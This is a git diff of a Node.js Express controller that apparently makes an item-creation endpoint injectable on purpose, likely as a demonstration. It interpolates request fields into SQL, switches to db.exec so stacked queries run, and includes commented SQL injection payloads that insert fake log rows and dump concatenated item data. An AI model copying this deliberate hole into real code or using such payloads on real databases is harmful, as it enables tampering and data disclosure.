@@ -2,10 +2,19 @@ const db = require("../models/database");
 
 exports.createItem = (req, res) => {
   const { name, description } = req.body;
-  const query = `INSERT INTO items (name, description) VALUES ('${name}', '${description}')`;
-  db.run(query, function (err) {
-    if (err) return res.status(500).json({ error: err.message });
-    res.json({ id: this.lastID });
+  console.log("Datos recibidos en el backend:", { name, description });
+
+  
+  // Construir la consulta que incluye una inyección SQL
+    query=  `INSERT INTO items (name, description) VALUES ('${name}', '${description}')`;
+    //dummy','dummy'); INSERT INTO logs (level, message, details, timestamp) VALUES ('info','SQL Injection successful','Injected via items', datetime('now')); --
+    //dummy','dummy'); INSERT INTO items (name, description) SELECT 'Concatenated Names: ' || GROUP_CONCAT(name, ', '),'Concatenated Descriptions: ' || GROUP_CONCAT(description, ', ') FROM items; INSERT INTO logs (level, message, details, timestamp) VALUES ('info','SQL Injection successful','Injected via items', datetime('now')); --
+  db.exec(query, function (err) {
+    if (err) {
+      console.error("Error en la consulta:", err);
+      return res.status(500).json({ error: err.message });
+    }
+    res.status(200).json({ message: "Item y log creados exitosamente." });
   });
 };
 
@@ -51,3 +60,5 @@ exports.deleteAllItems = (req, res) => {
     res.json({ deleted: this.changes });
   });
 };
+
+
